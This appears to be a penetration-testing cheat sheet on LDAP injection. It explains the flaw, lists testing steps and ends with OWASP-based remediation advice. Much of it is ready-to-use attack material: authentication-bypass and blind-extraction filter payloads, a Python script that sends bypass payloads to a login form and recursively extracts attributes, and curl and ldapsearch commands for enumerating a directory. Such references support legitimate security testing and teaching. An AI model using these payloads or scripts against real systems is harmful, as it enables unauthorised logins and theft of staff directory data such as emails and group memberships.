# LDAP Injection

## Overview
LDAP (Lightweight Directory Access Protocol) injection occurs when user-supplied input is concatenated into LDAP search filter strings without proper sanitization. LDAP is widely used in enterprise environments for authentication and directory services (Active Directory, OpenLDAP). An attacker who can inject LDAP metacharacters can bypass authentication, enumerate directory contents, and extract sensitive information such as usernames, email addresses, group memberships, and password hashes.

## How It Works
- An application builds an LDAP filter using user input: `(&(uid=USER)(password=PASS))`
- If USER is `admin)(|(uid=*`, the filter becomes: `(&(uid=admin)(|(uid=*)(password=PASS))`
- The `|(uid=*)` always evaluates to TRUE, so the filter matches any user regardless of password.
- LDAP has special characters: `(`, `)`, `*`, `\`, `NUL`, `&`, `|` — all of which have syntactic meaning in filter strings.
- Wildcard `*` in DN (distinguished name) searches can return all entries.
- Blind LDAP injection extracts data by asking true/false questions using filter logic.

## Impact
- Authentication bypass — log in as any user without knowing their password.
- Directory enumeration — extract all usernames, email addresses, groups, and organizational structure.
- Password hash extraction in environments where password attributes are accessible.
- Mapping of Active Directory/LDAP structure for privilege escalation planning.
- Access to sensitive attributes: mobile numbers, manager relationships, SSH keys.

## Where to Look
- Login forms that authenticate against LDAP/Active Directory.
- Search functionality that queries LDAP for users or groups.
- SSO systems and identity management portals.
- VPN login pages backed by LDAP.
- Corporate intranet applications using Windows authentication.
- Parameters named `username`, `uid`, `cn`, `mail`, `dn`, or similar.
- API endpoints returning user/group information from a directory service.

## Testing Steps
1. Identify the application uses LDAP (error messages mentioning "LDAP", "Active Directory", "DN", or LDAP-style error codes).
2. Inject a single `*` into the username field — if it logs in or returns all users, wildcard injection is confirmed.
3. Inject `)(` and observe for LDAP-specific error messages (unbalanced parentheses).
4. Try authentication bypass payloads: `admin)(&)`, `*)(&`, `*)(uid=*))(|(uid=*`.
5. Test search fields with `*` to enumerate all entries.
6. Attempt blind LDAP injection: inject `admin)(cn=a*` vs `admin)(cn=b*` and observe response differences.
7. Extract character by character: `admin)(cn=a*)(&` (does this return a result? If yes, first char of cn is 'a').
8. Enumerate group memberships: `admin)(memberOf=CN=Admins*`.
9. If LDAP errors are visible: note the full filter structure to understand query construction.
10. Test for blind injection using response timing or content differences.

## Payloads / Techniques

```ldap
-- LDAP special characters
( ) * \ NUL & | !
\28  = (
\29  = )
\2A  = *
\5C  = \
\00  = NUL

-- Authentication bypass payloads
-- Try as username (with any password)
*
*)(&
*)(|
admin)(&)
admin)(|(uid=*)
admin)(!(&(1=0)
)(cn=*))(|(cn=*
*)(uid=*))(|(uid=*
')(&'

-- Force TRUE condition
*)(|(password=*)
admin)(&(password=*)
admin)(|(objectClass=*)

-- Wildcard enumeration (username field)
*           -- Match all users
a*          -- Users starting with 'a'
admin*      -- Users starting with 'admin'
*@company*  -- Email addresses containing '@company'

-- Blind attribute extraction
-- Is first character of cn attribute 'a'?
admin)(cn=a*)(&
-- Is first character 'b'?  
admin)(cn=b*)(&
-- Continue: admin)(cn=ab*)(&, admin)(cn=ac*)(&, etc.

-- Enumerate group membership
admin)(memberOf=*)
admin)(memberOf=CN=Domain Admins*)
admin)(memberOf=CN=Administrators*)

-- Extract email addresses
*)(mail=*)(|(mail=*
)(mail=a*)(&
```

```python
import requests
import string

BASE = "https://target.com"

# Authentication bypass
def test_ldap_bypass():
    bypass_payloads = [
        ("*", "anything"),
        ("admin)(&)", "anything"),
        ("admin)(|(uid=*)", "anything"),
        ("*)(uid=*))(|(uid=*", "anything"),
        ("admin)(|(objectClass=*)", ""),
    ]
    
    for user, pwd in bypass_payloads:
        r = requests.post(f"{BASE}/login", data={
            "username": user,
            "password": pwd
        })
        if r.status_code == 200 and "dashboard" in r.text.lower():
            print(f"[VULNERABLE] Auth bypass with username='{user}'")
        else:
            print(f"[  ] username='{user}': {r.status_code}")

test_ldap_bypass()

# Blind LDAP enumeration via regex
def enumerate_usernames():
    found = []
    charset = string.ascii_lowercase + string.digits + "_"
    
    # Find all usernames starting with each char
    for first_char in charset:
        r = requests.post(f"{BASE}/login", data={
            "username": f"{first_char}*)(|(uid=*",
            "password": "anything"
        })
        # Adjust success indicator for your target
        if r.status_code == 200 and "Welcome" in r.text:
            print(f"[+] Username starts with: {first_char}")
            # Continue enumerating...
            found.append(first_char)
    
    return found

# Blind attribute extraction
def extract_attribute(attr_name, prefix=""):
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "@._-"
    for char in charset:
        test_prefix = prefix + char
        # Inject: look for entries where attr starts with test_prefix
        r = requests.post(f"{BASE}/login", data={
            "username": f"admin)({attr_name}={test_prefix}*)(&",
            "password": "x"
        })
        if r.status_code == 200 and "Success" in r.text:
            print(f"[+] {attr_name} starts with: {test_prefix}")
            return extract_attribute(attr_name, test_prefix)
    return prefix
```

```bash
# Manual LDAP injection tests with curl

# Authentication bypass
curl -X POST https://target.com/login \
  -d "username=*&password=anything"

curl -X POST https://target.com/login \
  -d "username=admin)(%26)&password=x"
# %26 = & URL-encoded

curl -X POST https://target.com/login \
  -d "username=*)(%7C(uid%3D*))%26(uid%3D*&password=x"

# Wildcard enumeration in search
curl "https://target.com/search?q=*&type=user"
curl "https://target.com/api/users?name=admin*"

# Test for LDAP errors
curl -X POST https://target.com/login \
  -d "username=test)(&(uid=test&password=x"
# Unbalanced parens may trigger LDAP error revealing filter structure
```

```bash
# ldapsearch to enumerate directory (if direct LDAP access available)
# (useful in internal network testing)
ldapsearch -x -H ldap://target.com -b "dc=company,dc=com" "(objectClass=person)" cn mail
ldapsearch -x -H ldap://target.com -b "dc=company,dc=com" "(uid=*)" uid cn mail
ldapsearch -x -H ldap://target.com -b "dc=company,dc=com" -D "cn=admin,dc=company,dc=com" -w "password" "(memberOf=CN=Domain Admins,CN=Users,DC=company,DC=com)"
```

## Burp Suite Tips
- **Intruder — Payload List**: Use a custom LDAP injection payload list including all special characters and operator combinations. Burp has a built-in "LDAP injection" payload list in Intruder.
- **Active Scanner**: Burp's scanner includes LDAP injection detection — run it against login and search endpoints.
- **Error Detection**: In Intruder results, grep for LDAP error strings: `Invalid DN syntax`, `LDAP Error`, `unwillingToPerform`, `javax.naming.directory`.
- **Comparer**: Compare login responses with and without the `*` wildcard to identify the LDAP authentication bypass oracle.
- **Repeater**: Manually craft LDAP filter strings in Repeater — adjust character encoding (URL-encode special chars for GET params, leave unencoded in POST bodies) to test all combinations.

## Tools
- **Burp Suite** — active scanner and manual LDAP injection.
- **OWASP ZAP** — active scanner with LDAP injection rules.
- **ldapsearch** — standard LDAP query tool for direct directory enumeration.
- **JXplorer** — GUI LDAP browser for directory exploration.
- **LDAP Injection tester (custom scripts)** — Python/Ruby scripts for blind LDAP enumeration.
- **Metasploit** — `auxiliary/scanner/ldap/` modules for LDAP enumeration.

## Remediation
- Use an LDAP library that supports parameterized queries or escaping — never build filter strings via string concatenation.
- Escape LDAP special characters in all user input: `(`, `)`, `*`, `\`, `NUL`, `/`.
- Escaping per RFC 4515: replace `*` with `\2a`, `(` with `\28`, `)` with `\29`, `\` with `\5c`, `NUL` with `\00`.
- In Java: use `javax.naming.ldap.LdapName` for DN construction; use OWASP's ESAPI `encodeForLDAP()` method.
- Validate input: reject usernames containing any LDAP metacharacters; enforce alphanumeric + safe chars only.
- Use LDAP service accounts with minimal permissions — read-only for authentication queries.
- Disable anonymous LDAP binding.
- Configure LDAP to not return sensitive attributes (passwords, private keys) in search results.

## References
https://owasp.org/www-community/attacks/LDAP_Injection
https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
https://portswigger.net/web-security/sql-injection (general injection concepts apply)
https://cwe.mitre.org/data/definitions/90.html
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection
